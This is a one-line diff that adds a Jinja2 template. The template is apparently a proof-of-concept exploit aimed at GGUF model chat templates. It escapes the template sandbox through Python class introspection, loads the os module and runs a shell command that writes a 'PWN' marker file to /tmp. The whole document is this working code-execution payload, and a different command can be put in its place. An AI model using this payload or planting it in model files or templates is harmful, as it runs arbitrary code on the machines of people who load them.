@@ -1,0 +1,1 @@
+{% for x in ().__class__.__base__.__subclasses__() %}{% if x.__name__ == 'BuiltinImporter' %}{{ x.load_module('os').system('echo PWN_GGUF_via_chat_template > /tmp/PWN_GGUF') }}{% endif %}{% endfor %}
